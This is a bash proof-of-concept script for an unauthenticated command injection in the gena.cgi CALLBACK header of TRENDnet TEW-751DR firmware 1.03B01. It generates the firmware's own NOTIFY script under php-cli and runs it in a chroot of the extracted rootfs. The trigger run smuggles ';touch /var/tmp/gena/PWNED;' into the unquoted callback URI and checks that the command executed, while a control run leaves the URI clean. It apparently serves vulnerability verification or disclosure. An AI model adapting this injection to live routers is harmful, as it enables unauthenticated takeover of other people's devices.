#!/bin/bash
# Control vs. trigger replay for the gena.cgi CALLBACK command injection.
#
#   CALLBACK: <http://<host>/<uri>>  ->  genacgi_main -> FUN_0040e740
#     -> run.NOTIFY.php -> gena.php::GENA_notify_init()
#     -> " -V HDR_URL=".$uri   (unquoted)  ->  "NOTIFY:0:sh <script>"  ->  xmldbc_timer
#
# The NOTIFY script is generated by the firmware's OWN htdocs/upnpinc/gena.php
# (run under php-cli, see gena_replay.py) and executed by the firmware's OWN
# /bin/sh inside the extracted rootfs. The only variable between the two runs
# is whether the URI segment contains ';cmd;'.
#
# Usage:
#   ROOTFS=/path/to/extracted/rootfs ./replay_gena_callback.sh
# Requires: php-cli, python3, qemu (only for the vendor /bin/sh), root for chroot.
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
R=${ROOTFS:-/tmp/gena-rootfs}
PHPGEN="$HERE/gena_replay.py"

[ -d "$R/htdocs/upnpinc" ] || { echo "rootfs not found: $R (set ROOTFS=...)" >&2; exit 1; }
[ -f "$PHPGEN" ] || { echo "missing $PHPGEN" >&2; exit 1; }

WORK="$R/var/tmp/gena"
mkdir -p "$WORK" "$R/var/tmp"
rm -f "$R/var/tmp/gena/PWNED" "$WORK"/ctl/WANIPConn1_1.sh "$WORK"/trg/WANIPConn1_1.sh

hdr_of() {  # print the unquoted HDR_URL word from a generated script
  python3 - "$1" <<'PY'
import re, sys
s = open(sys.argv[1], encoding="utf-8", errors="replace").read()
m = re.search(r"-V HDR_URL=(.*?) -V HDR_HOST=", s, re.S)
print("      -V HDR_URL=" + (m.group(1) if m else "<not found>"))
PY
}

echo "=== gena.cgi CALLBACK -> generated shell script (no authentication) ==="
echo "target : TRENDnet TEW-751DR 1.03B01"
echo "image  : TEW-751DRv1_(FW1.03B01).zip"
echo "sha256 : fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec"
echo "gena.php sha256: $(sha256sum "$R/htdocs/upnpinc/gena.php" | cut -c1-64)"
echo "single variable: the URI part of CALLBACK contains ';cmd;' or not"
echo "script generator: the firmware's own htdocs/upnpinc/gena.php (run under php-cli)"
echo

echo "########## CONTROL   CALLBACK: <http://10.0.0.9/aaa> ##########"
python3 "$PHPGEN" --rootfs "$R" --host 10.0.0.9 --uri "aaa" \
        --outdir "$WORK/ctl" --no-run >/dev/null 2>&1
hdr_of "$WORK/ctl/WANIPConn1_1.sh"
echo "  run with the firmware's own busybox sh (chroot):"
sudo -n chroot "$R" /bin/sh /var/tmp/gena/ctl/WANIPConn1_1.sh 2>&1 | sed 's/^/      /' | head -4
echo "  injected command executed?"
if [ -f "$R/var/tmp/gena/PWNED" ]; then
  echo "      /var/tmp/gena/PWNED exists: $(ls -l "$R/var/tmp/gena/PWNED" | awk '{print $1,$3":"$4,$5" bytes"}')"
else
  echo "      /var/tmp/gena/PWNED does not exist (expected: no injection)"
fi
echo

echo "########## TRIGGER   CALLBACK: <http://10.0.0.9/aaa;touch /var/tmp/gena/PWNED;bbb> ##########"
python3 "$PHPGEN" --rootfs "$R" --host 10.0.0.9 \
        --uri "aaa;touch /var/tmp/gena/PWNED;bbb" \
        --outdir "$WORK/trg" --no-run >/dev/null 2>&1
hdr_of "$WORK/trg/WANIPConn1_1.sh"
echo "  same busybox sh, same chroot, only the URI changed:"
sudo -n chroot "$R" /bin/sh /var/tmp/gena/trg/WANIPConn1_1.sh 2>&1 | sed 's/^/      /' | head -4
echo "  injected command executed?"
if [ -f "$R/var/tmp/gena/PWNED" ]; then
  echo "      /var/tmp/gena/PWNED exists: $(ls -l "$R/var/tmp/gena/PWNED" | awk '{print $1,$3":"$4,$5" bytes"}')"
else
  echo "      /var/tmp/gena/PWNED does not exist -- trigger failed"
fi
echo
echo "[replay done] control and trigger differ only in ';touch ...;' inside the URI"
